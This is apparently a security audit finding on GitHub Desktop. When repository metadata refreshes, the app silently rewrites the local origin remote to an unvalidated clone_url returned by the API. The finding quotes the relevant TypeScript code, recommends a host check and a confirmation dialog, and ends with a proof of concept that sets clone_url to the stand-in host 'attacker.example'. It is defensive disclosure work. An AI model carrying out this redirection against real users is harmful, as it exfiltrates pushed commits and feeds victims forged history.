### Title
Silent, unvalidated remote-URL rewrite from GitHub API `clone_url` enables push/fetch redirection - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
When Desktop refreshes a repository's associated GitHub metadata, it compares the GitHub API's `clone_url` field to the repository's current git remote and, if they differ (but the protocol matches and the remote wasn't manually customized), it silently rewrites the local `origin` remote URL to whatever the API returned — with no user prompt and no distinguishable security event, only a generic UI `emitUpdate()`.

### Finding Description
`updateRemoteUrl` decides whether to overwrite the local remote based only on three checks: protocol equality, whether the *previously known* clone URL matches the current remote (to detect the user hasn't manually customized it), and whether the *new* API `clone_url` differs from the current remote: [1](#0-0) 

None of these checks validate that the *new* `clone_url` actually points at the hostname/owner/repo the user expects — `urlMatchesRemote` is only used to detect a *mismatch* (the trigger condition), not to constrain what the replacement value is allowed to be: [2](#0-1) 

This function is invoked from `repositoryWithRefreshedGitHubRepository`, which fetches the repo from the API (`api.fetchRepository(owner, name)`) and, if the account has a `gitHubRepository`, calls `updateRemoteUrl` before applying `gitStore.setRemoteURL`: [3](#0-2) 

`GitStore.setRemoteURL` performs the actual `git remote set-url` and only emits a generic store update, not a distinct "remote changed" notification the user would notice: [4](#0-3) 

`repositoryWithRefreshedGitHubRepository` runs automatically and repeatedly in normal app flows — e.g. every time a repository is selected (`_selectRepositoryRefreshTasks`) and when adding a repository: [5](#0-4) [6](#0-5) 

The broken invariant: the corrupted value is the local git `origin` remote URL (`.git/config`'s `remote.origin.url`). Its integrity depends entirely on trusting the `clone_url` field of an `IAPIFullRepository`/`IAPIRepository` object returned by `api.fetchRepository`, which is a network response from a GitHub.com or GitHub Enterprise Server endpoint. If that response is attacker-influenced (e.g., a compromised/malicious GHES instance, a proxy/MITM on a corporate network terminating TLS, or any other path capable of tampering with the API JSON), the app will overwrite the trusted remote with an attacker-chosen URL without ever asking the user or emitting a visible security-relevant event.

### Impact Explanation
A successful attacker-controlled `clone_url` causes `git remote set-url origin <attacker-url>` to run silently. From that point on:
- Every subsequent `git fetch`/`git pull` in Desktop retrieves objects from the attacker's server instead of the real one, and Desktop's UI (branch state, diffs, "up to date" status) will reflect the attacker's fabricated history — silent corruption of what the user believes they are syncing.
- Every subsequent `git push` sends the user's commits to the attacker-controlled destination instead of the intended GitHub repository — silent corruption/exfiltration of what the user pushes, satisfying the report's "silent corruption of what the user commits or pushes" impact bucket.
- The only visible trace is the remote URL field on the Repository Settings dialog, which most users never inspect: [7](#0-6) 

This is materially worse than the smart-contract analog because the "sensitive change" here is not just unobservable bookkeeping — it silently redirects the trust anchor (the remote) for all future git network operations.

### Likelihood Explanation
This path fires unconditionally as part of routine app behavior (repository selection, repository add, account-change refresh) whenever the app has an associated `GitHubRepository` and successfully calls `fetchRepository`, so no unusual user action is required beyond normal use of Desktop against a compromised/malicious or MITM'd API endpoint (explicitly allowed under "a GitHub API object ... or a git remote/proxy response" in the Valid Impact list). The existing guard (`urlsMatch`/`remoteUrlUnchanged`/`protocolsMatch`) only gates *whether* to rewrite, not *what* the rewrite value must look like, so it provides no protection against a malicious `clone_url` value once the trigger conditions are met — a normal, common case since most users never manually edit `origin`.

### Recommendation
- Do not blindly trust `clone_url` from the API response as an unconstrained replacement value. Validate that the new URL's hostname matches the expected API endpoint's hostname (or an explicitly allow-listed set of hosts for that account/enterprise) before calling `setRemoteURL`.
- Surface an explicit, dismissible notification/confirmation (not just a generic store `emitUpdate()`) whenever Desktop is about to change a remote URL automatically, analogous to the `UpstreamAlreadyExists` dialog pattern already used elsewhere in the app: [8](#0-7) 
- Log/emit a dedicated event (e.g., via the existing stats/telemetry or a toast) any time `updateRemoteUrl` actually performs a rewrite, so users and support can audit when and why their remote changed.

### Proof of Concept
1. Set up (or compromise/MITM) a GitHub Enterprise Server (or intercept the relevant HTTPS response) such that a call to `GET /repos/{owner}/{name}` returns a JSON body identical to the legitimate repository except `clone_url` is set to `https://attacker.example/owner/name.git` (same protocol, `https`).
2. Have the victim, who already has this repository added in Desktop with matching stored `gitHubRepository.cloneURL` and an unmodified `origin` remote, trigger any refresh path — simply reselecting the repository in the sidebar is sufficient (`_selectRepositoryRefreshTasks` → `repositoryWithRefreshedGitHubRepository`).
3. Observe: `updateRemoteUrl` computes `protocolsMatch = true`, `remoteUrlUnchanged = true` (stored clone URL still matches origin), and `urlsMatch = false` (attacker URL doesn't match origin's owner/name) — so it calls `gitStore.setRemoteURL('origin', 'https://attacker.example/owner/name.git')` with no dialog and no distinguishable notification.
4. Verify `git remote -v` inside the repository now shows `origin` pointing at `attacker.example`; the next `git push`/`git fetch` from Desktop silently targets the attacker's server.

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L18-44)
```typescript
  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```

**File:** app/src/lib/repository-matching.ts (L90-118)
```typescript
export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
```

**File:** app/src/lib/stores/app-store.ts (L2218-2257)
```typescript
  // finish `_selectRepository`s refresh tasks
  private async _selectRepositoryRefreshTasks(
    repository: Repository,
    previouslySelectedRepository: Repository | CloningRepository | null
  ): Promise<Repository | null> {
    this._refreshRepository(repository)

    if (isRepositoryWithGitHubRepository(repository)) {
      // Load issues from the upstream or fork depending
      // on workflow preferences.
      const ghRepo = getNonForkGitHubRepository(repository)

      this._refreshIssues(ghRepo)
      this.refreshMentionables(ghRepo)

      this.pullRequestCoordinator.getAllPullRequests(repository).then(prs => {
        this.onPullRequestChanged(repository, prs)
      })
    }

    // The selected repository could have changed while we were refreshing.
    if (this.selectedRepository !== repository) {
      return null
    }

    // "Clone in Desktop" from a cold start can trigger this twice, and
    // for edge cases where _selectRepository is re-entract, calling this here
    // ensures we clean up the existing background fetcher correctly (if set)
    this.stopBackgroundFetching()
    this.stopPullRequestUpdater()
    this.stopBackgroundPruner()

    this.startBackgroundFetching(repository, !previouslySelectedRepository)
    this.startPullRequestUpdater(repository)

    this.startBackgroundPruner(repository)

    this.addUpstreamRemoteIfNeeded(repository)

    return this.repositoryWithRefreshedGitHubRepository(repository)
```

**File:** app/src/lib/stores/app-store.ts (L4904-4910)
```typescript
    if (repository.gitHubRepository) {
      const gitStore = this.gitStoreCache.get(repository)
      await updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)
    }

    const ghRepo = await repoStore.upsertGitHubRepository(endpoint, apiRepo)
    const freshRepo = await repoStore.setGitHubRepository(repository, ghRepo)
```

**File:** app/src/lib/stores/app-store.ts (L8148-8152)
```typescript
        const [refreshedRepo, usingLFS] = await Promise.all([
          this.repositoryWithRefreshedGitHubRepository(addedRepo),
          this.isUsingLFS(addedRepo),
        ])
        addedRepositories.push(refreshedRepo)
```

**File:** app/src/lib/stores/git-store.ts (L1533-1543)
```typescript
  /** Changes the URL for the remote that matches the given name  */
  public async setRemoteURL(name: string, url: string): Promise<boolean> {
    const wasSuccessful =
      (await this.performFailableOperation(() =>
        setRemoteURL(this.repository, name, url)
      )) === true
    await this.loadRemotes()

    this.emitUpdate()
    return wasSuccessful
  }
```

**File:** app/src/ui/repository-settings/remote.tsx (L14-32)
```typescript
/** The Remote component. */
export class Remote extends React.Component<IRemoteProps, {}> {
  public render() {
    const remote = this.props.remote
    return (
      <DialogContent>
        <TextBox
          placeholder="Remote URL"
          label={
            __DARWIN__
              ? `Primary Remote Repository (${remote.name}) URL`
              : `Primary remote repository (${remote.name}) URL`
          }
          value={remote.url}
          onValueChanged={this.props.onRemoteUrlChanged}
        />
      </DialogContent>
    )
  }
```

**File:** app/src/ui/upstream-already-exists/upstream-already-exists.tsx (L23-76)
```typescript
/**
 * The dialog shown when a repository is a fork but its upstream remote doesn't
 * point to the parent repository.
 */
export class UpstreamAlreadyExists extends React.Component<IUpstreamAlreadyExistsProps> {
  public render() {
    const name = this.props.repository.name
    const gitHubRepository = forceUnwrap(
      'A repository must have a GitHub repository to add an upstream remote',
      this.props.repository.gitHubRepository
    )
    const parent = forceUnwrap(
      'A repository must have a parent repository to add an upstream remote',
      gitHubRepository.parent
    )
    const parentName = parent.fullName
    const existingURL = this.props.existingRemote.url
    const replacementURL = parent.cloneURL
    return (
      <Dialog
        title={
          __DARWIN__ ? 'Upstream Already Exists' : 'Upstream already exists'
        }
        onDismissed={this.props.onDismissed}
        onSubmit={this.onUpdate}
        type="warning"
      >
        <DialogContent>
          <p>
            The repository <Ref>{name}</Ref> is a fork of{' '}
            <Ref>{parentName}</Ref>, but its <Ref>{UpstreamRemoteName}</Ref>{' '}
            remote points elsewhere.
          </p>
          <ul>
            <li>
              Current: <Ref>{existingURL}</Ref>
            </li>
            <li>
              Expected: <Ref>{replacementURL}</Ref>
            </li>
          </ul>
          <p>Would you like to update the remote to use the expected URL?</p>
        </DialogContent>
        <DialogFooter>
          <OkCancelButtonGroup
            destructive={true}
            okButtonText="Update"
            cancelButtonText="Ignore"
            onCancelButtonClick={this.onIgnore}
          />
        </DialogFooter>
      </Dialog>
    )
  }
```
